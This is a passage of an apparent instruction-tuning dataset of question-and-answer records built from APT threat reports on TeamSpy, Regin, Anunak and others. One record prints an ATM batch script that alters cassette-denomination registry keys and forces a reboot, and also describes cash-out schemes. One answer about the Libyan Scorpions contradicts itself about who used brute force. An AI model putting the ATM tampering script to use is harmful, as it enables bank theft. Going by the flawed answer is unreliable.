    "output": "Administrators can configure Exchange Online Advanced Threat Protection to react in several ways when it determines that an attachment contains malware. They can configure the system to block delivery of the message, notify administrators, and include a copy of the blocked message so they can analyze it themselves and determine whether additional action is necessary. The process of analyzing a message typically takes about four to five minutes, but administrators can set a 30-minute time limit for analysis, after which the message will either be delivered or blocked, depending on the administrator's preferences. This flexibility allows administrators to tailor the response to their organization's security needs and compliance requirements.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "behaviour remains largely profit-driven. In particular, the Ukrainian Government has not shown a capacity to harness volunteer cyber expertise, as Russia is thought to have done during its previous crises with Estonia and Georgia.\nMoscow has an inherent belief in the power of information control.\nSwedish Defence University researcher Margarita Levin Jaitner highlights current Russian Information Warfare (IW) theory in Chapter 10. She contends that Moscow has an inherent belief in the power of information control to advance its political and military goals. In Russian doctrine, cyber security is subordinate to information security, and cyberspace is only one part of the 'information space'. National security planners are concerned with both 'technical' and 'cognitive' attacks, and recognise that achieving information superiority involves everything from propaganda to hacking to kinetic military operations. Margarita Jaitner argues that the annexation of Crimea was a textbook case in information superiority.\nIn Chapter 11, Liisa Past, a NATO CCD COE expert on strategic communications, analyses leadership discourse. Liisa Past reveals that Russian President Vladimir Putin and Ukrainian President Petro Poroshenko have employed similar rhetorical strategies, including the development of an 'us vs. them' dichotomy in which the in-group is portrayed as constructive and solution-oriented, while the out-group is illegitimate and dangerous. In their current conflict, neither Russia nor Ukraine denies that cyberspace is a domain of warfare, but neither has stressed its importance. Russian political discourse has mostly overlooked cyber issues (which is in line with Russian military doctrine), while Ukraine has framed them within the larger concept of 'hybrid warfare'. The most notable difference in political rhetoric is Kyiv's clear orientation to the West and NATO, while Moscow is keenly focused on Russian national interests.\nElina Lange-Ionatamishvili and Sanda Svetoka of the NATO Strategic Communications Centre of Excellence in Latvia, in Chapter 12, discuss the role of social media in this conflict. In the Internet era, the battle for hearts and minds has never been more important. Social media is a trust-based network that provides fertile soil for intelligence collection, propaganda dissemination, and psychological operations (PSYOPS) to influence public opinion \u2013 or to lead adversaries into harm's way. 'Soft' cyber attacks can be as severe as any attack on critical infrastructure. In Ukraine, they have generated fear, uncertainty, and doubt about the economic, cultural, and national security of Ukraine, while promoting positive messages about Russia's role in Crimea and eastern Ukraine. The authors provide recommendations for defence against such attacks, including how to identify them, challenge them, and how to develop a resilient political narrative to withstand false propaganda.\nIn Chapter 13, University of Michigan doctoral student Nadiya Kostyuk reviews Ukraine's cyber security policy \u2013 past, present, and future. She analyses numerous historical factors that make Ukraine a cyber safe haven: a strong science, technol-\nogy, engineering, and mathematics (STEM) education, underwhelming economic performance since the fall of the Soviet Union in 1991, and social norms which dictate that stealing from the West is not a bad thing. The icing on the cake is that there are currently few cyber security regulations in Ukraine. All of these factors shed light on the vexing challenge of containing cyber crime in the region. Looking toward the future, Nadiya Kostyuk argues that Ukraine's political, military, and economic crises will inhibit the stabilisation of Ukrainian cyberspace for some time.\nLt Col Jan Stinissen of the NATO CCD COE, in Chapter 14, offers a legal framework for cyber operations in Ukraine. He explains that international law applies to cyberspace, and the law of armed conflict applies to all relevant cyber operations. Jan discusses the legal definitions of 'war' and 'cyberwar', as well as the concepts of 'armed conflict', 'armed attack', and 'use of force'. Typically, cyber attacks do not come in isolation, but rather as one element of a larger military operation; the wider context will determine the legal framework for its cyber component. There are many qualifying factors including state vs. non-state actor, and armed conflict vs. law enforcement. In the Ukraine crisis, operations in Crimea (which has already been annexed by Russia) may be viewed differently from those in eastern Ukraine. Stinissen asserts that, globally, most known cyber attacks have simply not been serious enough to be governed by the law of armed conflict, but that this is likely to change in the future.\nIn Chapter 15, NATO CCD COE researcher Henry R\u00f5igas discusses the impact of known cyber attacks in Ukraine on proposed political cyber 'norms', the rules of state behaviour in international relations. On the positive side, the absence of attacks against critical infrastructure could be a boon to future international security and stability, especially if it is a result of intentional restraint on the part of Moscow and Kyiv. This case challenges the prevailing perception that a loose normative framework currently allows states to employ cyber attacks as a tool for coercion. On the negative side, the examples of computer network operations we have seen appear to violate the information security norms promoted by Russia and the Shanghai Cooperation Organisation (SCO), as they seem to constitute a war on information itself, that is a dedicated effort to alter public opinion through deceptive propaganda.\nFinnish Professor Jarno Limn\u00e9ll, in Chapter 16, discusses the ramifications of the Ukraine war, and its cyber component, for Russia's neighbours. Moscow's aggressive behaviour in Ukraine has forced many countries to re-evaluate their political and military relationships, especially with NATO. For historical reasons, Finland and Estonia are well positioned to analyse Russia's use of hybrid warfare, including information operations. Today, these countries are actively pursuing ways to bolster their national defences against Russia's military strategies and tactics in Ukraine. The NATO Alliance should take concrete measures to reassure its member states, such as the creation of a common cyber defence framework.\nIn Chapter 17, Jason Healey and Michelle Cantos of Columbia University imagine four potential cyber conflict scenarios in this crisis. First, even if the hot\nHostile nation-state cyber operations are a long-term, dynamic, multidimensional threat.\nwar cools off, Russia can still raise the temperature in cyberspace, and cause serious network disruptions in Ukraine. Second, Russia could selectively target the West, adding a new vector to its already increased volume of threats, military exercises, submarine deployments, and nuclear warnings. Third, Vladimir Putin could mirror the 'frozen conflict' dynamic in cyberspace by threatening prolonged disruptions of the global Internet. And fourth, if the Ukraine conflict spins out of control, Russia, in desperation, might even have the power to take down the Internet entirely.\nTo close our book, in Chapter 18, Brookings Institution Nonresident Senior Fellow Richard Bejtlich offers essential advice not only for Ukraine, but for any nation or organisation wishing to improve its cyber security posture. Bejtlich draws from the deep well of classic military doctrine, arguing that hostile nation-state cyber operations are not a single event but a long-term, dynamic, multidimensional threat. The only hope that Ukraine or any other nation has for building an effective defence against professional network attacks is to incorporate strategic thinking into its defensive architecture, personnel, and operations.\nQ: What are the key differences in the rhetorical strategies employed by Russian President Vladimir Putin and Ukrainian President Petro Poroshenko during the current conflict, as analyzed by Liisa Past?",
    "output": "According to Liisa Past, both Russian President Vladimir Putin and Ukrainian President Petro Poroshenko have employed similar rhetorical strategies, including the development of an 'us vs. them' dichotomy where the in-group is portrayed as constructive and solution-oriented, while the out-group is illegitimate and dangerous. However, the most notable difference in their political rhetoric is Kyiv's clear orientation towards the West and NATO, while Moscow is keenly focused on Russian national interests. Neither side denies that cyberspace is a domain of warfare, but neither has stressed its importance, with Russia mostly overlooking cyber issues and Ukraine framing them within the larger concept of 'hybrid warfare'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Maintaining Teamwork and Infrastructure\nOur investigation of the team's infrastructure centers around two domains used for command-and-control: \"politnews.org\" and \"bannetwork.org\". But clearly, the strategy guiding this team is to pull off multiple \"watering hole\" attacks, and sometimes pollute ad networks, inefficiently blanketing the region they are most interested in with malvertizing and redirections to their malicious sites. These two servers have been heavily used over years of attack campaigns, with more recent servers receiving tens if not hundreds of hits in the past week.\n\"politnews.org\" was originally registered on the June 18th, 2004 by one \"Zacepenko Ilia Igorevich\" at OnlineNIC Inc:\nZacepenko Ilia Igorevich\n9th square, 10-1,1\nNI Larne, GB 127591\npolitnews@mail.ru\n\"bannetwork.org\" was originally registered on September 2nd, 2004 by one \"Dmitryi Ivastov\" at OnlineNIC Inc as well:\nDmitryi Ivastov\nMira street, 1a\nMoscow, RU 103555\nbannetwork@mail.ru\nWe believe that these are fictional identities and used only to register these individual domains.\nThe two servers resided at several hosts over the past decade, but from 2010, both domains were maintained at Russian provider Host Telecom. (known malicious IP for \"bannetwork.org\": \"89.188.104.7\").\nFor the most part, these systems maintain identical toolsets, structure, software and accounts. Both of these systems hosted an FTP server and an Apache HTTP web server, along with the same user accounts for running each. The HTTP servers were used to serve \"job.txt\", which maintained a set of system commands for agents checking in, among other files described below. Interestingly, other files included \"html\" pages and exploits related to the well-known exploit kit \"\", created and maintained by Exmanoize.\nAlso, one of the server scripts to collect infection success statistics mentions the Eleonore exploit kit by name:\nAnd one of the more recent, current sites, \"checkmeil.com\", is serving both malicious java and pdf files. Of course, just like Eleonore started serving couple of years ago, it defaults to deliver a malicious JAR file first, prior to other exploits potentially sent to the victim system.\nThe 2012 version of \"door.jar\" (CVE-2012-0507) exploit is blocked proactively by our AEP functionality at runtime and detected by Kaspersky products as \"HEUR:Exploit.Java.CVE-2012-0507.gen\".\nA malicious PDF is served if the Java Runtime is not present on the system. Our products detect this particular malicious file as Exploit.JS.Pdfka.gbf.\nMost of the TeamSpy servers are using a free, Russian open source tool named \"\". This is a set of PHP scripts designed to \"read and display RSS feeds on your site\". Most likely, the attackers planned their attacks well in advance and built a set of web sites using these scripts to provide news aggregation channels serving content at least somewhat relevant to their target victims' favorite web sites.\nOver the past years, the attackers added exploit packs like Eleonore on their news aggregation sites. Then, the attackers injected iframes into carefully selected web sites frequently visited by their target victims. The iframes redirect these target visitors (and some extras) to their previously-prepared malicious sites. For instance, redirections from \"konflikt.ru\" to the attackers' \"bannetwork.org\" started in October 2005. In February 2006, users were redirected from \"daymohk.org\" to \"bannetwork.org\", followed by \"www.turkmenistan.gov.tm\" and \"chechentimes.net\" in March. The list of infected watering hole sites continued to grow from there.\nAttacks from the \"bannetwork.org\" site appear to have been related to the following links by at least February 2010:\nbannetwork(dot)org/5058/spl/\nbannetwork(dot)org/5058/spl/inc/function.php\nbannetwork(dot)org/5058/spl/ms-041.jpg\nbannetwork(dot)org/5058/spl/vx_2c.exe\nbannetwork(dot)org/5058/spl/new-ms-041.jpg\nBased on the server access stats, we were able to put together a thorough list of web sites which appear to have acted as referrers to the exploit packs. Since the early infections, it appears that they have been compromised and redirecting visitors on and off until recently:\ndaymohk.org\nchechenpress.info\ndaymohk.chechenpress.org\nchechentimes.net\ncaucasuslive.org\nkauna-talu.com.ua\ntimorseada.org\nmediaf.org\nichkeria.info\nkavkazanhaamash.com\nrusedina.org\nkonflikt.ru\nforum.ladoshki.com\nshaheeds.org\nhghltd.yandex.com\nturkmenistan.gov.tm\nAnswer this question: How did the TeamSpy crew leverage legitimate software tools and services to carry out their watering hole attacks, and what specific exploit kits did they integrate into their operations?",
    "output": "The TeamSpy crew utilized legitimate software tools and services to execute their watering hole attacks by setting up news aggregation sites using a free, Russian open source tool named ''. They built these sites to provide news aggregation channels that served content relevant to their target victims' favorite websites. Over time, they added exploit packs like Eleonore to these sites. The attackers then injected iframes into carefully selected websites frequently visited by their target victims, redirecting them to their previously prepared malicious sites. Specifically, they used exploit kits such as Eleonore and served malicious Java and PDF files. For example, a 2012 version of 'door.jar' (CVE-2012-0507) exploit was used, which is detected by Kaspersky products as 'HEUR:Exploit.Java.CVE-2012-0507.gen', and a malicious PDF file detected as 'Exploit.JS.Pdfka.gbf'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Initial compromise and lateral movement\nThe exact method used for the initial compromise remains a mystery, although several theories exist, including use of man-in-the-middle attacks with browser zero-day exploits. For some of the victims we observed tools and modules designed for lateral movement. So far we have not encountered any exploits. The replication modules are copied to remote computers using Windows administrative shares and then executed. Obviously this technique requires administrative privileges inside the victim's network. In several cases the infected machines were also Windows domain controllers. Targeting of system administrators via web-based exploits is a simple way of achieving immediate administrative access to the entire network.\nMedium Headline: Stage 1 \u2013 32/64 bit\nffb0b9b5b610191051a7bdf0806e1e47\nIn general, the first samples victims detect in their networks are stage 1 loaders. These are the easiest to notice because they are the only executables that exist directly on the victim's computer.\nThese samples use an odd technique to load the next stages, which until recently was unique to Regin. Interestingly, in mid-2012, the ZeroAccess gang implemented a very similar loading mechanism, which possibly suggests it learned about Regin and its unique features. (See ).\nThe particular feature used (or abused) by Regin to hide its next stages is called NTFS Extended Attributes (EA). Originally, these were implemented in Windows NT for compatibility with OS/2 applications; however, they made their way into later versions of Windows, namely 2000, XP and Vista. The malware hides its modules in NTFS EAs, splitting large files into several blocks of limited size. These are dynamically joined, decrypted and executed in memory.\nMost of the stage 1 samples we have seen appear to have been built on top of other source code projects, which are 'piggybacked'; for instance, the Ser8UART project: .\nFor instance, the Regin loader with md5 01c2f321b6bfdb9473c079b0797567ba was built on top of the Ser8UART source code. A careful examination however spots the encrypted configuration block at offset 0x5600.\nWe can assume the attackers take various low-level open-source projects or Windows DDK source codes and merge them together with their malicious loader. Hence, each stage 1 loader looks very different from others, as it contains random useless code from various other programs. This technique makes it more difficult to build reliable detection for the loaders.\nDespite the differences, all stage 1 samples are similar in functionality. They contain an encrypted config block that points to the next stages:\nOnce decrypted, the block contains several folder names and registry key names:\nIn the example above, the stage 1 tries to load a second stage from the extended attributes of the system directory specified in the configuration block (in our case, the WINDOWS folder). It also tries to read additional data from the EAs of the second directory (in our case, the WINDOWS\\fonts directory). The second attribute value is optional and may have been used to overcome size limitations.\nIf the first EA data block is missing, the module also tries to read the complete body of the 2nd stage from a registry value using the key and value names from the configuration block.\nThe body of the second stage is encrypted with one of two algorithms that are simple variations of XOR, and is supposed to be a PE file. The first stage loads that file in memory and calls its entry point function.\nThe 64-bit variant works in a slightly different way. Instead of storing the 2nd stage in the registry or extended attributes, the attackers preferred to store it after the end of the last partition on disk.\nKnown filenames for the 64-bit stage 1:\n\u2022 system32\\wsharp.dll \u2013 detected on a victim machine in Germany\n\u2022 system32\\wshnetc.dll \u2013 detected on a victim machine in Belgium\nAll the stage 1 modules for 64-bit systems were signed with fake digital certificates. The two fake certificates we identified are supposed to belong to Microsoft Corporation and Broadcom Corporation. During the infection phase, the attackers inject a trusted CA in the certificates chain, which instructs the system to trust their signatures.\nHere is what the hard drive of a 64-bit system infected with Regin looks like:\nInterestingly, while the 32-bit Regin stage 1 runs in kernel mode, on 64-bit systems the attacker code starts in user mode. This is perhaps due to the fact that it is more difficult to run kernel mode on modern Windows 64-bit systems.\nMedium Headline: Stage 2 \u2013 loader \u2013 32-bit\nThe second stage for 32-bit systems is implemented as a driver module. It has a configuration block encrypted in a similar way to the first stage module. The configuration block contains the names of two system directories that hold the encrypted third stage in their extended attributes. It also has the name of a registry value that may hold the body of the third stage in case the EAs are missing (for computers with a FAT/FAT32-formatted system disk).\nOnce the encrypted third stage is read from the registry or NTFS EAs, it is decrypted using the RC5 algorithm and a fixed 16-byte key that is hardcoded in the second stage. Then, it is decompressed using the NRV2e algorithm from the open-source UCL library. The second stage module loads the resulting binary in memory, validates that it is a valid PE file, and calls its entry point in a system thread.\nThe second stage also creates a marker file that can be used to identify the infected machine. Known filenames for this marker are:\n\u2022 %SYSTEMROOT%\\system32\\nsreg1.dat\n\u2022 %SYSTEMROOT%\\system32\\bssec3.dat\n\u2022 %SYSTEMROOT%\\system32\\msrdc64.dat\nThese files have their timestamp set to the timestamp of the system file '%SYSTEMROOT%\\system32\\lsass.exe'\nThe second stage has additional code for removing the startup code of Regin if signaled by the third stage. Its configuration data contains the locations of the first three stages, including registry keys, names of the directories that hold the encrypted EAs, and the location of the initial driver.\nEssentially, the second stage can remove all the Regin stages from the system, effectively cleaning the machine and leaving only the encrypted VFS behind.\nDecrypted configuration block of the second stage\nMedium Headline: Stage 2 \u2013 loader \u2013 64-bit\nThe 64-bit version of the second stage loader is a PE DLL module, since the 64-bit bootstrap chain operates in user mode.\nJust like the first stage, it loads the encrypted body of the next stage from the end of the physical disk and decrypts it with a hardcoded RC5 key, then decompresses it using the nrv2 algorithm from the UCL library.\nAfter decryption and decompression, the code checks if the next stage is a Windows PE DLL module, and if it is, it loads and executes it.\nMedium Headline: Stage 3 \u2013 32-bit \u2013 kernel mode manager \"VMEM.sys\"\nOn 32-bit systems, the third stage is implemented as a driver module and provides the basic functionality of the malicious framework. It is responsible for operating the encrypted virtual file system and loading additional plugins, and also provides several built-in plugins for the entire framework.\nThe module initializes the framework, sets up the plugin system and starts the actual work cycle of the malware. It also passes execution to the plugin id 50221 that is loaded from the VFS.\nBuilt-in plugins provided by this module are:\nMedium Headline: Stage 3 \u2013 64-bit\nOn 64-bit Windows systems, stage 3 is missing. Stage 2 loads the dispatcher directly from the disk and runs it.\nStage 4 (32-bit) / 3 (64-bit) \u2013 dispatcher module, 'disp.dll'\n32-bit\n64-bit\nThe dispatcher library is the user-mode core of the framework. It is loaded directly as the third stage of the 64-bit bootstrap process, or extracted and loaded from the VFS as module 50221 as the fourth stage on 32-bit systems.\nIt implements a set of internal plugins:\nThe dispatcher takes care of the most complicated tasks of the Regin platform, such as providing an API to access virtual file systems, basic communications and storage functions, as well as network transport subroutines. In essence, the dispatcher is the brain that runs the entire platform.\n\nQuestion: How does Regin utilize NTFS Extended Attributes (EA) to hide its next stages, and why might this technique be particularly effective?\n\nAnswer:",
    "output": "Regin uses NTFS Extended Attributes (EA) to hide its modules by splitting large files into several blocks of limited size. These blocks are dynamically joined, decrypted, and executed in memory. This technique is effective because it leverages a lesser-known feature originally intended for compatibility with OS/2 applications, making it harder for traditional antivirus software to detect the presence of the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Libyan Scorpions' use of brute force password guessing in their attack campaign relate to their overall tactics, techniques, and procedures (TTPs)?",
    "output": "Brute Force: Password Guessing is a technique used by adversaries to gain unauthorized access to accounts by systematically guessing passwords. In the context of the Libyan Scorpions' attack campaign, brute force password guessing was attempted by Cyberkov's Security Incident Response Team (CSIRT) to gain access to the attackers' database. Although the attempt failed, it highlights the importance of password security in preventing unauthorized access. Furthermore, the Libyan Scorpions' use of a PhpMyAdmin script and a Dell laptop with Skype installed suggests that they may have used weak passwords or had limited password security measures in place, making them vulnerable to brute force attacks. This lack of password security is consistent with the attackers' overall TTPs, which involved using social engineering tactics and exploiting vulnerabilities in legitimate applications to spread their malware. Overall, the Libyan Scorpions' use of brute force password guessing is just one aspect of their broader attack campaign, which relied on a combination of technical exploits and social engineering tactics to achieve their goals.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: The malicious script contains the following commands:\nContents of the file \"1.bat\"\nrEG aDD \"HkEY_local_MacHINE\\sofTWarE\\ Wincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_1 /t rEG_sZ /d \"5000\" /f rEG aDD \"HkEY_local_MacHINE\\sofTWarE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_2 /t rEG_sZ /d \"1000\" /f rEG aDD \"HkEY_local_MacHINE\\sofTWarE\\ Wincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_3 /t rEG_sZ /d \"500\" /f rEG aDD \"HkEY_local_MacHINE\\sofTWarE\\ Wincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_4 /t rEG_sZ /d \"100\" /f\nrEG aDD \"HkEY_local_MacHINE\\sofTWarE\\ Wincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_1 /t rEG_sZ /d \"100\" /f rEG aDD \"HkEY_local_MacHINE\\sofTWarE\\\nWincor Nixdorf\\ProTopas\\currentVersion\\lYNX-Par\\casH_DIsPENsEr\" /v ValUE_4 /t rEG_sZ /d \"5000\" /f\nshutdown -r -t 0 \u2013f\nFigure. Service program KDIAG32 for Wincor ATMs\nExecution of this file changed registry keys in the registry branch \"\"HKEY_LOCAL_MACHINE\\ SOFTWARE\\Wincor Nixdorf\\ProTopas\\Current-Version\\LYNXPAR\\CASH_DISPENSER\"\" that are responsible for cassette denominations in an ATM. As a result of this file execution the registry key that is in charge of the cassette number 1 (VALUE_1) is takes the value \"100\", and the registry key responsible for the cassette number 4 (VALUE_4) is set to \"5000\". Then the command to restart the computer is issued. The registry key reference values:\nIf the ATM actual load corresponds to the reference one and registry keys have been changed, then the banknotes from the cassette No.1 will be issued with denomination \"5000\" instead of \"100\".\nMedium Headline: withdrawal of all cash from dispenser\nIn addition, the attackers used a modified debug\nprogram that allows by the command to issue money from the dispenser. The original debug program issues money through the dispenser only when the open ATM housing and the vault door are fixed.\nIn order to ensure money issuance from the closed ATM the attackers had to modify the original program \"KDIAG32\" (the original file: size of 1,128,960 MD5 4CC1A6E049942EBDA395244C74179EFF).\nA comparison of the original version of the program with the modified version showed that the only difference is in ignoring error \"\"Door not opened or missing!\"\". The figure below shows an error message that will be never displayed to the user in the file under investigation.\nBig Headline: AnDromeDA usAge\nAll traces found during investigation of one incident showed that the same criminal group had worked. Ammy Admin was used for remote access, the same\nSSHD backdoor was installed on Unix servers and, In addition, it was loaded from the same hacked server as in other cases of trojan Anunak usage. However, in this case Andromeda is used as the main trojan instead of Anunak. The management servers were located in Kazakhstan, Germany and Ukraine. Check of the management servers showed that it was the hosting Bulletproof that, in addition to servers, provides a service of traffic proxying through its infrastructure as well as TOR and VPN usage, so this pattern is significantly differs from the Anunak hosting patern. Check of money cashout showed that the same cashout criminal group had worked as for Anunak and this fact again confirmed their cooperation.\nObtained Andromeda trojan copies were being distributed from August 2014 by e-mail. The value 754037e7be8f61cbb1b85ab46c7da77d, which is the MD5 hash of the string \"go fuck yourself\", was used as the RC4 encryption key. As a result of this distribution from August to late October the Andromeda botnet rose up to 260,000 bots. Successful infection in one subnet resulted in sending such letters to other bank employees. Example of forwarding from an infected bank network to employees of another bank is shown below.\nAs a result of this radial mailing many oil and gas companies, banks and government agencies were infected. In Russia at least 15 banks and two payment systems were infected this way.\nLetters with similar attachments were being distributed with the following subjects:\n\"My new photo\"\n\"Alert Transactions Report by users from 2014-09-28 to 2014-09-28\"\nBig Headline: cAshouT schemAs\nPreviously, it should be noted the fact that the process of stolen money withdrawal (cashout) was differed, firstly by the theft method, secondly by the\nvictim type (a bank or a payment system), thirdly by the total stolen sum.\nThe victims by their type were divided rather by counterparty types and by limitations imposed by operation with the counterparties. For example, all payments were required to go through a certain pool of mediators. In addition, the \"improper\" pool of counterparties could cause suspicion and unnecessary testing (manual processing of payment orders).\nBank (amounts up to 100 million roubles):\n\u2022 When the attackers had obtained control of a bank operator workstation (attacker purpose), they in general used a classic tree scheme when funds from the bank account were sent to several legal entities, then from each legal entity to smaller legal entities (may be several such iterations) and then to private person credit cards (from 600 to 7000 transactions).\n\u2022 When the attackers had obtained control of ATM management service (attacker purpose), money were withdrawn directly from the ATM by the attacker command. In this case the whole cashout process consisted in that a drop person had to be near the ATM at the specified time with a bag to empty the dispenser.\nBank (amounts from 100 million roubles):\n\u2022 Money was sent to accounts of other banks, and cracked banks were often used where accounts and credit cards had been prepared in advance.\nPayment system:\n\u2022 In addition to all the above methods, cash sending channels were also employed through the settlements systems, electronic wallets and payment systems, such as web money, Yandex\nMoney, QIWI (1500-2000 transactions). Revenues of large amounts (up to 50 million roubles) were recorded to particular cards of private persons who then used these cards to buy expensive small-sized goods such as jewelry, watches, and other attributes. A huge part of the money was sent through mobile operators (1500-2000 SIM cards prepared in advance).\n\u2022 In spring 2014 (high time of this fraud type) 2 cashout person groups were known who supported target attacks, by autumn 2014 their number\nincreased to 5. In general, this increase was due to number of thefts too (number of victims + average stolen sum per 1 victim). The groups are working in different cities to ensure better cashout distribution. Also these groups include immigrants from former Soviet republics who if necessary arrive in the required city. Each group was monitored by a separate person. Each group consists of about 15-20 people.\n\u2022 Part of the money was transferred to Ukraine and Belarus.\nBig Headline: ATTAcks in euroPe AnD usA\nWhile the attacks in Russia against banks and payment systems have occurred over the past two years, the attacks against the retail industry is only something which started in the second quarter of 2014. With at least three confirmed breaches where card track data was obtainedand a total of at least 16 breaches at retail organizations, it is also becoming a serious threat.\nApart from retail organizations it is also known that a number of media and PR companies have been breached in 2014. While it is not entirely certain, the type of breaches suggest that the attackers are looking for inside information, a type of industrial espionage, allowing them to gain an advantage on the stock market. As there is nothing specifically missing and the resulting fraud is hard to match with anything, these incidents typically are never linked.\nMedium Headline: infection methods\nFrom the retail perspective, the first infections in 2014 were sourced from a botnet which employs a widely deployed crypto-currency mining malware based on the Gozi/ISFB (banking) malware family. Based on our insights we believe during the first half of 2014 over half a million systems had been compromised by this malware from over the whole world, however Russia and a number of post-Soviet states were clean of infections. To find interesting infections within this large set of compromised systems, the malware extracts relevant information from the systems including Microsoft Windows organization registration information and network/ Windows domain information.\nThe Gozi/ISFB based malware was used to drop additional components on interesting systems, which included Metasploit/Meterpreter payloads\nand Anunak variants. This was one of the main methods for the group using Anunak to obtain interesting infections in the middle of 2014, sourcing infections from other botnet operators.More recently other infection methods, including spear phishing using English language and possibly also usage of the teams own Andromeda, but also SQL injection to breach an organization directly from the outside, has been employed by this team.\nMedium Headline: pos compromises\nThe first known attacks with Anunak targeted a specific brand of POS systems which revolved around the Epicor/NSB brand. To do this Anunak has specific code to target POS devices equipped with this software, which in contrary to the more common memory scanning track data scrapers, logs a wealth of information from the payments done by the cards. The first case this was seen active was in July 2014, but it might have been earlier as well.\nMore recent breaches have used a new custom developed POS malware, which is a more simple but reliable track data memory scraper. The initial version from the early fall of 2014 used a simple blacklist, scraped every process and dumped track data in plain text. More recent versions scanned only configuration specified processes and used RC4 to encrypt the extracted track data records on disk.\nQuestion: What modifications were made to the original debug program 'KDIAG32' to enable money issuance from a closed ATM, and how did this modification facilitate the attack?",
    "output": "Answer: The original debug program 'KDIAG32' was modified to ignore the error 'Door not opened or missing!', which normally prevents money from being issued unless the ATM housing and vault door are open. By removing this restriction, the attackers ensured that money could be issued from the ATM even when it was closed. This modification facilitated the attack by allowing the attackers to command the ATM to dispense cash without physically opening it, making the theft more discreet and efficient.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nFireEye Labs recently discovered a previously unknown variant of the APT backdoor XSLCmd \u2013 OSX.XSLCmd \u2013 which is designed to compromise Apple OS X systems. This backdoor shares a significant portion of its code with the Windows-based version of the XSLCmd backdoor that has been around since at least 2009.\nThis discovery, along with other industry findings, is a clear indicator that APT threat actors are shifting their eyes to OS X as it becomes an increasingly popular computing platform.\nAcross the global threat landscape, there has been a clear history of leveraging (or porting) Windows malware to the Apple OS X platform. In 2012, AlienVault discovered a document file exploiting an older vulnerability in Microsoft Word that installs a backdoor named \"(<http://www.alienvault.com/open-threat-exchange/blog/ms-office-exploit-that-targets-macos-x-seen-in-the-wild-delivers-mac-contro>)MacControl\" on OS X systems. The group responsible for those attacks had been targeting Tibetan non-government organizations (NGOs). (<http://bad-bytes.blogspot.com/2012/07/maccontrol-cyber-espionage-rat-linked.html>)It was later discovered that the code for this backdoor was borrowed from an existing Windows backdoor, whose source code can be found on several Chinese programming forums.\nIn 2013, Kaspersky reported on a threat actor group they named \"(<http://securelist.com/blog/research/57331/the-icefog-apt-a-tale-of-cloak-and-three-daggers/>)IceFog\" that had been attacking a large number of entities related to military, mass media, and technology in South Korea and Japan. This group developed their own backdoor for both Windows and OS X. And just this year, Kaspersky published a report on a group they named (<http://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf>)\"Careto/Mask\" that utilized an open source netcat-like project designed to run on *nix and Windows systems named 'sbd' which they wrapped in a custom built installer for OS X.\nBased on our historical intelligence, we believe the XSLCmd backdoor is used by APT, including a group that we call \"GREF.\" We track this threat group as \"GREF\" due to their propensity to use a variety of Google references in their activities \u2013 some of which will be outlined later in this report. Our tracking of GREF dates back to at least the 2009 timeframe, but we believe they were active prior to this time as well. Historically, GREF has targeted a wide range of organizations including the US Defense Industrial Base (DIB), electronics and engineering companies worldwide, as well as foundations and other NGO's, especially those with interests in Asia.\n\nWhat insights can be drawn from the historical intelligence on the XSLCmd backdoor and its association with the APT group known as 'GREF'? How does understanding the tactics and targets of this group help in improving cybersecurity strategies?",
    "output": "Historical intelligence suggests that the XSLCmd backdoor has been associated with the APT group 'GREF', which has been active since at least 2009. GREF is known for targeting a diverse range of organizations, including the US Defense Industrial Base, electronics and engineering companies, and NGOs, particularly those with interests in Asia. Understanding the tactics and targets of GREF helps cybersecurity experts tailor their defenses more effectively. By knowing the types of organizations and regions that GREF typically targets, security professionals can implement more specific and proactive measures to protect against these advanced persistent threats. Additionally, recognizing the group's tendency to use Google references in their activities can aid in identifying and mitigating potential threats more quickly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Operation Molerats utilize XtremeRAT, and what specific indicators were used to track this activity?",
    "output": "In 2012, XtremeRAT was used in Operation Molerats against various governments as well as Israeli and Palestinian targets. One particular sample beaconed to 'test.cable-modem.org' and 'idf.blogsite.org'. The attacker used XtremeRAT 2.9 within a self-extracting archive that also presented a decoy document. The controller used the ID field to record the type of attack delivered (docx) and the Group field to record a 'campaign code' (IDF). The attacker modified the default password to '1411' and changed the default process mutex name to 'fdgdfdg'. These indicators, along with command and control domain names and IP addresses, were used to cluster and track this activity over time.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Summary\nLast December, our senior malware researcher (Mr. Abhishek Singh) posted an article about a Trojan which could detect mouse clicks to evade sandbox analysis. Interestingly, we have found another spear phishing document that downloads malware which incorporates improved mouse click detection anti-sandboxing capability. It also leverages multiple advanced evasion techniques to achieve stealth and persistent infection. The name of malicious document is translated to be \"Islamic Jihad.doc\". Hence, we suspect that this weaponized document was used to target the governments of Middle East and Central Asia.\nThis new malware is significant for several reasons:\nIt detects multiple mouse clicks: In the past, evasion methods using mouse clicks only detected a single click, making the malware fairly easy to overcome.\nThe callback goes to a legitimate URL: Often when malware performs its callback, the communication goes directly to the CnC server. In this case, the callback goes to a legitimate URL shortening service, which would then redirect the communication to the CnC server. Automated blocking technologies are likely to block only the URL shortening service and not the CnC server.\nIt has anti-forensic capability: This malware doesn't kick into high gear immediately. Instead it requires an Internet connection for malicious code to be downloaded to the memory and executed. Unlike predecessors that are very obvious and immediately get to work, this malware is merely a husk and its true malicious intent could only be found in the downloaded code. This prevents forensic investigators from extracting the \"true\" 